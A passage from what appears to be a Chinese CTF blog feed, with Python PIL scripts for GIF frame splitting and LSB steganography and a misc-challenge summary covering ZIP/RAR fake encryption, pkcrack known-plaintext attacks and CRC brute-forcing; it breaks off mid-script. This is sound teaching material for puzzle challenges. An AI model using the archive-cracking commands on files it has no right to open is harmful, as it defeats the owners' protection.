title="图像分帧"></a>图像分帧</h3><p>seek()和tell()</p><p>tell是读取帧数，而seek是取当前帧数的图片。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">im = Image.open(<span class="string">&quot;flag.gif&quot;</span>)</span><br><span class="line">im.seek(<span class="number">1</span>)</span><br><span class="line">im.show()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        im.seek(im.tell()+<span class="number">1</span>)</span><br><span class="line">        im.show()</span><br><span class="line"><span class="keyword">except</span> EOFError:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="常见CTF题目"><a href="#常见CTF题目" class="headerlink" title="常见CTF题目"></a>常见CTF题目</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="图片模式"><a href="#图片模式" class="headerlink" title="图片模式"></a>图片模式</h4><p>9种，分别为1，L，P，RGB，RGBA，CMYK，YCbCr，I，F。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">模式&quot;1&quot;为二值图像，非黑即白。但是它每个像素用8个bit表示，0表示黑，255表示白。</span><br><span class="line"></span><br><span class="line">模式L&quot;为灰色图像，它的每个像素用8个bit表示，0表示黑，255表示白，其他数字表示不同的灰度。在PIL中，从模式&quot;RGB&quot;转换为&quot;L&quot;模式是按照下面的公式转换的</span><br><span class="line"> L &#x3D; R * 299&#x2F;1000 + G * 587&#x2F;1000+ B * 114&#x2F;1000</span><br><span class="line"></span><br><span class="line">模式&quot;P&quot;为8位彩色图像，它的每个像素用8个bit表示，其对应的彩色值是按照调色板查询出来的。</span><br><span class="line"></span><br><span class="line">模式&quot;RGBA&quot;为32位彩色图像，它的每个像素用32个bit表示，其中24bit表示红色、绿色和蓝色三个通道，另外8bit表示alpha通道，即透明通道。</span><br><span class="line"></span><br><span class="line">模式&quot;CMYK&quot;为32位彩色图像，它的每个像素用32个bit表示。模式&quot;CMYK&quot;就是印刷四分色模式，它是彩色印刷时采用的一种套色模式，利用色料的三原色混色原理，加上黑色油墨，共计四种颜色混合叠加，形成所谓&quot;全彩印刷&quot;。</span><br><span class="line"> 四种标准颜色是：C：Cyan &#x3D; 青色，又称为&#39;天蓝色&#39;或是&#39;湛蓝&#39;M：Magenta &#x3D; 品红色，又称为&#39;洋红色&#39;；Y：Yellow &#x3D; 黄色；K：Key Plate(blacK) &#x3D; 定位套版色（黑色）。PIL中&quot;RGB&quot;转换为&quot;CMYK&quot;的公式如下：</span><br><span class="line"> C &#x3D; 255 - R</span><br><span class="line"> M &#x3D; 255 - G</span><br><span class="line"> Y &#x3D; 255 - B</span><br><span class="line"> K &#x3D; 0</span><br><span class="line"></span><br><span class="line">模式&quot;YCbCr&quot;为24位彩色图像，它的每个像素用24个bit表示。YCbCr其中Y是指亮度分量，Cb指蓝色色度分量，而Cr指红色色度分量。人的肉眼对视频的Y分量更敏感，因此在通过对色度分量进行子采样来减少色度分量后，肉眼将察觉不到的图像质量的变化。</span><br><span class="line"> 模式&quot;RGB&quot;转换为&quot;YCbCr&quot;的公式如下：</span><br><span class="line"> Y&#x3D; 0.257*R+0.504*G+0.098*B+16</span><br><span class="line"> Cb &#x3D; -0.148*R-0.291*G+0.439*B+128</span><br><span class="line"> Cr &#x3D; 0.439*R-0.368*G-0.071*B+128</span><br><span class="line"></span><br><span class="line">模式&quot;I&quot;为32位整型灰色图像，它的每个像素用32个bit表示，0表示黑，255表示白，(0,255)之间的数字表示不同的灰度。在PIL中，从模式&quot;RGB&quot;转换为&quot;I&quot;模式是按照下面的公式转换的：</span><br><span class="line"> I &#x3D; R * 299&#x2F;1000 + G * 587&#x2F;1000 + B * 114&#x2F;1000</span><br><span class="line"></span><br><span class="line">模式&quot;F&quot;为32位浮点灰色图像，它的每个像素用32个bit表示，0表示黑，255表示白，(0,255)之间的数字表示不同的灰度。在PIL中，从模式&quot;RGB&quot;转换为&quot;F&quot;模式是按照下面的公式转换的：</span><br><span class="line"> F &#x3D; R * 299&#x2F;1000+ G * 587&#x2F;1000 + B * 114&#x2F;1000</span><br><span class="line"> 模式&quot;F&quot;与模式&quot;L&quot;的转换公式是一样的，都是RGB转换为灰色值的公式，但模式&quot;F&quot;会保留小数部分.</span><br><span class="line"></span><br><span class="line">模式&quot;RGB&quot;为24位彩色图像，它的每个像素用24个bit表示，分别表示红色、绿色和蓝色三个通道。</span><br><span class="line"> 在PIL中，对于彩色图像，open后都会转换为&quot;RGB&quot;模式，然后该模式可以转换为其他模式，比如&quot;1&quot;、&quot;L&quot;、&quot;P&quot;和&quot;RGBA&quot;，这几种模式也可以转换为&quot;RGB&quot;模式。</span><br></pre></td></tr></table></figure><h4 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h4><p>拿到许多图片，只有全白和全黑，考虑白色是0，黑色是1。</p><p>首先获取指定坐标的rgb，然后写脚本转换成二进制，二进制转化ascii。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = Image.open(<span class="string">&#x27;./gif/0.jpg&#x27;</span>)</span><br><span class="line">print(list(img.getpixel((<span class="number">1</span>,<span class="number">1</span>))))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">104</span>):</span><br><span class="line">    img = Image.open(<span class="string">&#x27;./gif/&#123;&#125;.jpg&#x27;</span>.format(i))</span><br><span class="line">    <span class="keyword">if</span> list(img.getpixel((<span class="number">1</span>,<span class="number">1</span>)))==[<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>]:</span><br><span class="line">        flag+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(flag),<span class="number">8</span>):</span><br><span class="line">    flag+=chr(int(flag[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h4 id="glance-gif"><a href="#glance-gif" class="headerlink" title="glance.gif"></a>glance.gif</h4><p>具体思路就是分帧，粘贴，但是在写脚本的时候还需要仔细一点，有许多细节需要处理。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">im=Image.open(<span class="string">&#x27;glance.gif&#x27;</span>)</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">        im.seek(im.tell()+<span class="number">1</span>)</span><br><span class="line">        im.save(<span class="string">&#x27;./gif/&#123;&#125;.png&#x27;</span>.format(i))</span><br><span class="line"><span class="keyword">except</span> EOFError:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">im2=Image.new(<span class="string">&#x27;RGBA&#x27;</span>,(<span class="number">2</span>*<span class="number">201</span>,<span class="number">600</span>))</span><br><span class="line">width = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">201</span>):</span><br><span class="line">    image=Image.open(<span class="string">&#x27;./gif/&#123;&#125;.png&#x27;</span>.format(i))</span><br><span class="line">    im2.paste(image,(width,<span class="number">0</span>,<span class="number">2</span>+width,<span class="number">600</span>))</span><br><span class="line">    width = width +<span class="number">2</span></span><br><span class="line">im2.save(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line">im2.show()</span><br></pre></td></tr></table></figure><p>在一开始处理的时候，我是直接拼接的图片，没有尝试先去打开一个图片(open)然后粘贴，程序报错。</p><p><code>ValueError: unknown color specifier: &#39;./gif/1.png&#39;</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">image=Image.open(<span class="string">&#x27;./gif/&#123;&#125;.png&#x27;</span>.format(i))<span class="comment">#这个很重要。</span></span><br><span class="line">im2.paste(image,(width,<span class="number">0</span>,<span class="number">2</span>+width,<span class="number">600</span>))</span><br></pre></td></tr></table></figure><p>这里的坐标位置一定要处理好，首先我们需要知道，图像的高度和宽度。由于只需要横向粘贴，也就是说图片都需要集中在一行上，所以第二个坐标一定是0，第四个坐标一定是图片的高度。每个图片宽2，所以第一个和第二个坐标相差2，每张图片的间隔距离也是2。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">im2.paste(image,(width,<span class="number">0</span>,<span class="number">2</span>+width,<span class="number">600</span>))</span><br></pre></td></tr></table></figure><h4 id="LSB隐写"><a href="#LSB隐写" class="headerlink" title="LSB隐写"></a>LSB隐写</h4><p>任何一个像素点的颜色可由<strong>三原色RGB</strong>确定，每个颜色有8bit，因而RGB最大取值为 <code>(255, 255, 255)</code>——RGB一共包含2563=16777216‬2563=16777216‬（1600万）种颜色，而人眼可以区分约1000万种不同的颜色，这意味着剩余约600万种颜色人眼无法识别。</p><p>LSB隐写就是将信息藏在各个像素点的某个颜色的最后一位上，因为是最后一位，对颜色的更改是人眼无法识别出来的，起到了隐藏的效果。</p><p>例子：</p><p>倘若在一张图片中，我们想隐藏 <code>A</code> 这个信息，那么先将 <code>A</code> 的十六进制Unicode码 <code>0x61</code> 转换为二进制 <code>01100001</code>我们在三原色中随机选择一种颜色——比如说<strong>红</strong>，因为要隐藏的 <code>A</code> 占8个位，所以在这张图片中<strong>任意</strong>选择<strong>连续</strong>的8个像素点，将这8个像素点的RGB，代表红色的8bit的最后一位，依次修改为 <code>01100001</code>。</p><p>举个例子：</p><p>假设您想要将消息”A”隐藏到一个4x4的图像中，该图像具有以下像素值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[(225, 12, 99), (155, 2, 50), (99, 51, 15), (15, 55, 22),(155, 61, 87), (63, 30, 17), (1, 55, 19), (99, 81, 66),(219, 77, 91), (69, 39, 50), (18, 200, 33), (25, 54, 190)]</span><br></pre></td></tr></table></figure><p>使用 ASCII 表 ，我们可以先将机密消息转换为十进制值，然后再转换为二进制：0110100。现在，我们对像素值逐一进行迭代，在将它们转换为二进制后，我们将每个最小有效位依次替换为该信息位。（例如 225 是 11100001，我们替换最后一位，最右边的（1）和机密消息的第一位（0），依次类推)。这样的操作只会对像素值进行 +1 或 -1 的修改，因此肉眼根本看不出来。执行最低有效位隐写术后得到的像素值如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[(224, 13, 99),(154, 3, 50),(98, 50, 15),(15, 54, 23),(154, 61, 87),(63, 30, 17),(1, 55, 19),(99, 81, 66),(219, 77, 91),(69, 39, 50),(18, 200, 33),(25, 54, 190)]</span><br></pre></td></tr></table></figure><p>png图片是一种无损压缩的位图片形格式，也只有在无损压缩或者无压缩的图片（BMP）上实现lsb隐写。如果图像是jpg图片的话，就没法使用lsb隐写了，原因是jpg图片对像数进行了有损压缩，我们修改的信息就可能会在压缩的过程中被破坏。</p><p>查看图片模式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.open(<span class="string">&#x27;01.png&#x27;</span>)</span><br><span class="line">width,height=img.size</span><br><span class="line">print(img.mode)</span><br></pre></td></tr></table></figure><p>可以看到图片是L模式。最大特点就是像素没有<code>r,g,b</code>这么多，只有1个。</p><p>取图片的像素值的二进制的最后一位与1与运算，得到的数据如果为0则是白色，如果为1则是黑色。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.open(<span class="string">&#x27;01.png&#x27;</span>)</span><br><span class="line">width,height=img.size</span><br><span class="line">print(img.mode)</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,width):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,height):</span><br><span class="line">        tmp = img.getpixel((i,j))</span><br><span class="line">        print(<span class="string">&quot;原本像素为：&quot;</span>,tmp)</span><br><span class="line">        print(tmp&amp;<span class="number">1</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.open(<span class="string">&#x27;01.bmp&#x27;</span>)</span><br><span class="line">width,height=img.size</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,width):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,height):</span><br><span class="line">        tmp = img.getpixel((i,j))</span><br><span class="line">        <span class="keyword">if</span> tmp&amp;<span class="number">0x1</span> == <span class="number">0</span>:</span><br><span class="line">            img.putpixel((i,j),<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            img.putpixel((i,j),<span class="number">255</span>)</span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTF-python库的使用-PIL库&quot;&gt;&lt;a href=&quot;#CTF-python库的使用-PIL库&quot; class=&quot;headerlink&quot; title=&quot;CTF-python库的使用-PIL库&quot;&gt;&lt;/a&gt;CTF-python库的使用-PIL库&lt;/h1&gt;&lt;h2 i</summary>
      
    
    
    
    <category term="CTF-python" scheme="http://s1eady.top/categories/CTF-python/"/>
    
    
    <category term="CTF-python" scheme="http://s1eady.top/tags/CTF-python/"/>
    
  </entry>
  
  <entry>
    <title>CTF-杂项题总结</title>
    <link href="http://s1eady.top/2020/11/10/CTF-%E6%9D%82%E9%A1%B9%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    <id>http://s1eady.top/2020/11/10/CTF-%E6%9D%82%E9%A1%B9%E9%A2%98%E6%80%BB%E7%BB%93/</id>
    <published>2020-11-10T14:14:20.000Z</published>
    <updated>2020-11-06T11:27:41.312Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTF-杂项"><a href="#CTF-杂项" class="headerlink" title="CTF-杂项"></a>CTF-杂项</h1><h2 id="压缩包"><a href="#压缩包" class="headerlink" title="压缩包"></a>压缩包</h2><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>注释藏头flag，查看注释可以放入winhex查看十六进制的末尾(最好使用这种方式，因为有时候压缩包注释可能是隐藏的)，或者直接压缩软件查看十六进制。如果遇到隐藏的注释，可以放入sublim或者notepad++。</p><p>如果RAR压缩包中有注释的话，在winhex中的ascii中会有CMT字段。</p><h3 id="zipinfo查看元数据"><a href="#zipinfo查看元数据" class="headerlink" title="zipinfo查看元数据"></a>zipinfo查看元数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ zipinfo -v &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;1.zip</span><br><span class="line">Central directory entry #1:</span><br><span class="line">---------------------------</span><br><span class="line"></span><br><span class="line">  1.py</span><br><span class="line"></span><br><span class="line">  offset of local header from start of archive:   0</span><br><span class="line">                                                  (0000000000000000h) bytes</span><br><span class="line">  file system or operating system of origin:      MS-DOS, OS&#x2F;2 or NT FAT</span><br><span class="line">  version of encoding software:                   6.3</span><br><span class="line">  minimum file system compatibility required:     MS-DOS, OS&#x2F;2 or NT FAT</span><br><span class="line">  minimum software version required to extract:   2.0</span><br><span class="line">  compression method:                             deflated</span><br><span class="line">  compression sub-type (deflation):               normal</span><br><span class="line">  file security status:                           not encrypted</span><br><span class="line">  extended local header:                          no</span><br><span class="line">  file last modified on (DOS date&#x2F;time):          2020 Nov 6 11:55:08</span><br><span class="line">  32-bit CRC value (hex):                         01e344f3</span><br><span class="line">  compressed size:                                385 bytes</span><br><span class="line">  uncompressed size:                              771 bytes</span><br><span class="line">  length of filename:                             4 characters</span><br><span class="line">  length of extra field:                          36 bytes</span><br><span class="line">  length of file comment:                         0 characters</span><br><span class="line">  disk number on which file begins:               disk 1</span><br><span class="line">  apparent file type:                             binary</span><br><span class="line">  non-MSDOS external file attributes:             000000 hex</span><br><span class="line">  MS-DOS file attributes (20 hex):                arc </span><br><span class="line"></span><br><span class="line">  The central-directory extra field contains:</span><br><span class="line">  - A subfield with ID 0x000a (PKWARE Win32) and 32 data bytes.  The first</span><br><span class="line">    20 are:   00 00 00 00 01 00 18 00 d0 b0 f5 9d f0 b3 d6 01 d0 b0 f5 9d.</span><br><span class="line"></span><br><span class="line">  There is no file comment.</span><br></pre></td></tr></table></figure><h3 id="压缩包解压"><a href="#压缩包解压" class="headerlink" title="压缩包解压"></a>压缩包解压</h3><p>大多是使用python自动化解压，常用的python库为<code>zipfile</code>、<code>unrar</code>。</p><p>比如：</p><p>直接批量读取文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">32</span>):</span><br><span class="line">f=open(<span class="string">&#x27;C:/Users/12521/Desktop/subject/&#x27;</span>+str(i)+<span class="string">&#x27;/&#x27;</span>+str(i)+<span class="string">&#x27;.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">flag+=f.read()</span><br><span class="line">print(base64.b64decode(flag))</span><br></pre></td></tr></table></figure><p>批量解压带有密码的压缩包，文件名字就是压缩包的密码(zip、rar同理)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> unrar <span class="keyword">import</span> rarfile</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unzip</span>(<span class="params">zipname</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        passwd = zipname[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line">        zf = rarfile.RarFile(<span class="string">&#x27;C:/Users/12521/gif/&#x27;</span>+zipname,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        zf.extractall(<span class="string">&#x27;./gif/&#x27;</span>,pwd=passwd)</span><br><span class="line"><span class="comment">#        zf.close()</span></span><br><span class="line">        os.remove(zipname)</span><br><span class="line">        zipname = zf.namelist()[<span class="number">0</span>].replace(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        print(zipname)</span><br><span class="line">unzip(<span class="string">&quot;flag.rar&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="伪加密ZIP"><a href="#伪加密ZIP" class="headerlink" title="伪加密ZIP"></a>伪加密ZIP</h3><p>总结：通过<strong>压缩源文件目录区50 4B 01 02 1F 00 14 00 0奇/偶 00 来表示是否加密</strong>。</p><h3 id="伪加密RAR"><a href="#伪加密RAR" class="headerlink" title="伪加密RAR"></a>伪加密RAR</h3><p>RAR的标记块和结束块都是固定的7字节序列，分别为0x52 61 72 21 1A 07 00和0xC4 3D 7B 00 40 07 00。文件块这边要注意一下HEAD_FLAGS这个头部，其中HEAD_FLAGS的低三位代表加密标志，此位若被置为1，则文件使用了基于密钥的加密。</p><h3 id="明文攻击"><a href="#明文攻击" class="headerlink" title="明文攻击"></a>明文攻击</h3><p>前提：</p><p>有一个已知的文件，然后加密的压缩包中也有一个我们已知的文件，这时候我们可以尝试明文攻击。</p><p>攻击方式：</p><p>首先我们需要把我们的已知的文件使用winrar进行压缩，这里必须使用winrar文件，而且我们需要保证我们手动压缩的文件和我们需要解密的文件后缀以及压缩方式是一样的。</p><p>这里使用工具可以直接破解。如果工具提示无法载入，可以使用winrar的修复功能对压缩包进行修复。</p><h4 id="两个文件"><a href="#两个文件" class="headerlink" title="两个文件"></a>两个文件</h4><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/1.png" alt="1"></p><p>具体的文件拓扑图</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/2.png" alt="2"></p><p>明文攻击的具体特点就是敏感文件的CRC值是一样的。这里我们可以使用WINRA工具进行查看。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/3.png" alt="3"></p><h4 id="只有一个文件"><a href="#只有一个文件" class="headerlink" title="只有一个文件"></a>只有一个文件</h4><p>手动生成一个文件然后<code>rbkcrack.exe</code>进行破解。</p><h4 id="kali-明文攻击"><a href="#kali-明文攻击" class="headerlink" title="kali 明文攻击"></a>kali 明文攻击</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;bin$ .&#x2F;pkcrack -c &quot;logo.png&quot; -p logo.png  -C &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;flag.zip -P &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;logo.zip -d .&#x2F;1.zip</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-C:要破解的目标文件(含路径)</span><br><span class="line"></span><br><span class="line">-c:破解文件中的明文文件的名字(其路径不包括系统路径,从zip文件一层开始)</span><br><span class="line"></span><br><span class="line">-P:压缩后的明文文件</span><br><span class="line"></span><br><span class="line">-p:压缩的明文文件中明文文件的名字(也就是readme.txt在readme.zip中的位置)</span><br><span class="line">-d:指定文件名及所在的绝对路径，将解密后的zip文件输出</span><br></pre></td></tr></table></figure><h3 id="CRC爆破高度"><a href="#CRC爆破高度" class="headerlink" title="CRC爆破高度"></a>CRC爆破高度</h3><p>修改图片高度，当图片高度出现问题的时候，我们需要根据CRC值爆破出高度，修改高度拿到flag。并且图片高度出现问题的时候，在linux下，图片无法正常打开。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/5.png" alt="5"></p><p>使用脚本根据CRC的值爆破出正常的高度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">p=<span class="number">0</span></span><br><span class="line">m = open(<span class="string">&quot;flag.png&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5000</span>):</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">5000</span>):</span><br><span class="line">        c = m[<span class="number">12</span>:<span class="number">16</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i) + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+m[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc = binascii.crc32(c) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span> crc == <span class="number">0x3d9a65d0</span>:</span><br><span class="line">            p=<span class="number">1</span></span><br><span class="line">            <span class="comment">#print(c)</span></span><br><span class="line">            print(hex(i),hex(j))</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="CRC爆破文件内容"><a href="#CRC爆破文件内容" class="headerlink" title="CRC爆破文件内容"></a>CRC爆破文件内容</h3><p>CRC校验实用程序库，在数据存储和数据通讯领域，为了保证数据的正确，就不得不采用检错的手段。 在诸多检错手段中，CRC是最著名的一种。CRC的全称是循环冗余校验。 在产生CRC32时，源数据块的每一位都参与了运算，因此即使数据块中只有一位发生改变也会得到不同 的CRC32值，利用这个原理我们可以直接爆破出加密文件中的内容。 每个文件都有唯一的CRC32值，即便数据中一个bit发生变化，也会导致CRC32值不同。若是知道一段数 据的长度和CRC32值，便可穷举数据，与其CRC32对照，以此达到暴力猜解的目的。但限于CPU的能 力，通常只适用于较小文本文件。</p><p>通常情况下加密文件一般比较小，可以爆破CRC的值。而且爆破crc的位数通常与文件的大小有关。</p><h4 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">s=string.printable</span><br><span class="line">c =[<span class="number">0xF3B61B38</span>,<span class="number">0xF3B61B38</span>,<span class="number">0X6ABF4A82</span>,<span class="number">0X5ED1937E</span>,<span class="number">0X09b9265b</span>,<span class="number">0x84b12bae</span>,<span 